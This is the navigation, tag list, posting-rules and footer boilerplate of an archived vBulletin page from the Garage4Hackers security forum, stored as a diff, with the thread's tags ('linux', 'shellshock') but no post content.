+		
+			
+				<li><a href="forumdisplay9780.html?f=14">General Security Discussions</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplay9df8.html?f=31">Programming</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay65b9.html?f=35">Assembly</a></li>
+			
+		
+			
+				<li><a href="forumdisplayc4f1.html?f=32">C/C++</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb0a0.html?f=34">Perl</a></li>
+			
+		
+			
+				<li><a href="forumdisplayb8c1.html?f=60">PHP</a></li>
+			
+		
+			
+				<li><a href="forumdisplay6c4e.html?f=33">Python</a></li>
+			
+		
+			
+				<li><a href="forumdisplay208f.html?f=51">Linux Shell / Bash Programming</a></li>
+			
+		
+			
+				<li><a href="forumdisplay3238.html?f=47">Windows Batch Programming</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayce40.html?f=28">BackTrack and Other Linux Distributions</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf2fa.html?f=16">Networks &amp; Networking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya213.html?f=18">Cloud Computing</a></li>
+			
+		
+			
+				<li><a href="forumdisplaydfa4.html?f=39">Security Podcast and Videos</a></li>
+			
+		
+			
+				<li><a href="forumdisplaya3f5.html?f=40">Miscellanous Thread</a>
+					<ol class="d2">
+						
+		
+			
+				<li><a href="forumdisplay30ac.html?f=49">Brush Up Your Skills</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+			
+				<li><a href="forumdisplayffeb.html?f=20">Experts Forum</a>
+					<ol class="d1">
+						
+		
+			
+				<li><a href="forumdisplaycdba.html?f=48">My Meanest Hacks</a></li>
+			
+		
+			
+				<li><a href="forumdisplayf6ac.html?f=37">Hacking &amp; Security Books and Tutorials</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8011.html?f=23">Tools &amp; Scripts</a></li>
+			
+		
+			
+				<li><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+			
+		
+			
+				<li><a href="forumdisplay345c.html?f=24">Reverse Engineering and Application Cracking</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye8b3.html?f=25">Botnets, Malwares &amp; Rootkits Analysis</a></li>
+			
+		
+			
+				<li><a href="forumdisplay107e.html?f=43">Garage4hackers Exploits</a></li>
+			
+		
+			
+				<li><a href="forumdisplaye5f3.html?f=64">Browser Fuzzing</a></li>
+			
+		
+			
+					</ol>
+				</li>
+			
+		
+		
+	</ul>
+</div>
+<div class="clear"></div>
+	</div>
+</div>
+
+
+
+
+
+
+
+
+
+
+<!-- next / previous links -->
+<div class="navlinks">
+	
+	<strong>&laquo;</strong>
+	<a href="showthread455d.html?t=6902&amp;goto=nextoldest" rel="nofollow">Previous Thread</a>
+	|
+	<a href="showthread3204.html?t=6902&amp;goto=nextnewest" rel="nofollow">Next Thread</a>
+	<strong>&raquo;</strong>
+	
+</div>
+<!-- / next / previous links -->
+
+<div id="thread_info" class="thread_info">
+	
+	
+	
+	
+	<h4 class="threadinfohead"><span class="optiontitle">Tags for this Thread</span></h4>
+	<div id="thread_tags_list" class="thread_info_block">
+		<div class="inner_block">
+			
+			<div id='tag_list_cell'>
+				
+		
+			<a href="tags6d29.html?tag=linux">linux</a>, 
+		
+			<a href="tags9dcc.html?tag=shellshock">shellshock</a>
+		
+
+<img src="images/misc/11x11progress.html" id="tag_form_progress" class="inlineimg hidden" alt="" />
+			</div>
+			<p>
+				<a href="tags.html">View Tag Cloud</a>
+			</p>
+		</div>
+	</div>
+	
+	<div class="options_block_container">
+		
+		<div class="options_block">
+			<h4 class="collapse">
+				<a class="collapse" id="collapse_posting_rules" href="showthread23a9.html?t=6915&amp;goto=nextoldest#top"><img src="images/buttons/collapse_40b.png" alt="" /></a>
+				<span class="optiontitle">Posting Permissions</span>
+			</h4>
+			<div id="posting_rules" class="thread_info_block">
+				
+<div id="forumrules" class="info_subblock">
+
+	<ul class="youcandoblock">
+		<li>You <strong>may not</strong> post new threads</li>
+		<li>You <strong>may not</strong> post replies</li>
+		<li>You <strong>may not</strong> post attachments</li>
+		<li>You <strong>may not</strong> edit your posts</li>
+		<li>&nbsp;</li>
+	</ul>
+	<div class="bbcodeblock">
+		<ul>
+			<li><a href="miscaff0.html?do=bbcode" target="_blank">BB code</a> is <strong>On</strong></li>
+			<li><a href="misc9712.html?do=showsmilies" target="_blank">Smilies</a> are <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#imgcode" target="_blank">[IMG]</a> code is <strong>On</strong></li>
+			<li><a href="miscaff0.html?do=bbcode#videocode" target="_blank">[VIDEO]</a> code is <strong>On</strong></li>
+			<li>HTML code is <strong>Off</strong></li>
+		</ul>
+	</div>
+	<p class="rules_link"><a href="misc17ec.html?do=showrules" target="_blank">Forum Rules</a></p>
+
+</div>
+
+			</div>
+		</div>
+
+	</div>
+
+</div>
+
+
+
+
+
+
+
+
+<div style="clear: left">
+  
+<div class="google_adsense_footer" style="width:468px; margin:0 auto; padding-top:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 468;
+google_ad_height = 60;
+google_ad_format = "468x60_as";
+google_ad_type = "text_image";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+  <div id="ad_global_above_footer"><div align="center">
+<script type="text/javascript"><!--
+google_ad_client = "pub-6847984837250662";
+/* 728x90, created 7/9/10 */
+google_ad_slot = "7101394260";
+google_ad_width = 728;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script></div>
+</div>
+
+<div id="footer" class="floatcontainer footer">
+
+	<form action="../external.html?link=http://garage4hackers.com/forum.php" method="get" id="footer_select" class="footer_select">
+
+		
+			<select name="styleid" onchange="switch_id(this, 'style')">
+				<optgroup label="Quick Style Chooser"><option class="hidden"></option></optgroup>
+				
+					
+					<optgroup label="&nbsp;Standard Styles">
+									
+					
+	<option value="1" class="" selected="selected">-- Default Style</option>
+
+					
+					</optgroup>
+										
+				
+				
+					
+					<optgroup label="&nbsp;Mobile Styles">
+					
+					
+	<option value="2" class="" >-- Default Mobile Style</option>
+
+					
+					</optgroup>
+										
+				
+			</select>	
+		
+		
+		
+	</form>
+
+	<ul id="footer_links" class="footer_links">
+		<li><a href="sendmessage.html" rel="nofollow" accesskey="9">Contact Us</a></li>
+		<li><a href="index.html">Garage4hackers</a></li>
+		
+		
+		<li><a href="archive/index.html">Archive</a></li>
+		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		
+		
+		<li><a href="showthread23a9.html?t=6915&amp;goto=nextoldest#top" onclick="document.location.hash='top'; return false;">Top</a></li>
+	</ul>
+	
+	
+	
+	
+	<script type="text/javascript">
+	<!--
+		// Main vBulletin Javascript Initialization
+		vBulletin_init();
+		function md5hash(B,A,E,C){if(navigator.userAgent.indexOf("Mozilla/index.html")==1&&parseInt(navigator.appVersion)>=4){var D=hex_md5(str_to_ent(trim(B.value)));A.value=D;if(E){D=hex_md5(trim(B.value));E.value=D}if(!C){B.value=""}}return true};
+	//-->
+	</script>
+        
+</div>
+</div> <!-- closing div for body_wrapper -->
+
+<div class="below_body">
+<div id="footer_time" class="shade footer_time">All times are GMT +5.5. The time now is <span class="time">05:04 PM</span>.</div>
+
+<div id="footer_copyright" class="shade footer_copyright">
+	<!-- Do not remove this copyright notice -->
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	<!-- Do not remove this copyright notice -->	
+</div>
+<div id="footer_morecopyright" class="shade footer_morecopyright">
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	
+	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
+	Copyright 2010 - 2017, Garage4Hackers
+	
+</div>
+ 
+
+	<div id="fb-root"></div>
+<script type="text/javascript" src="clientscript/vbulletin_facebook6719.js?v=421"></script>
+
+<script type="text/javascript">
+<!--
+	loadFacebookAPI('en_US');
+	function fbAsyncInit()
+	{
+		vBfb = new vB_Facebook({
+			appid : "170793809601191",
+			connected : 0,
+			active : 0,
+			autoreg : 0,
+			feed_newthread : 1,
+			feed_postreply : 1,
+			feed_blogentry : 1,
+			feed_blogcomment : 1,
+			feed_newarticle : 1,
+			feed_articlecomment : 1
+		});
+	}
+// -->
+</script>
+
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try{
+var pageTracker = _gat._getTracker('UA-17311051-3');
+pageTracker._trackPageview();
+} catch(err) {}</script>
+</body>
+</html>
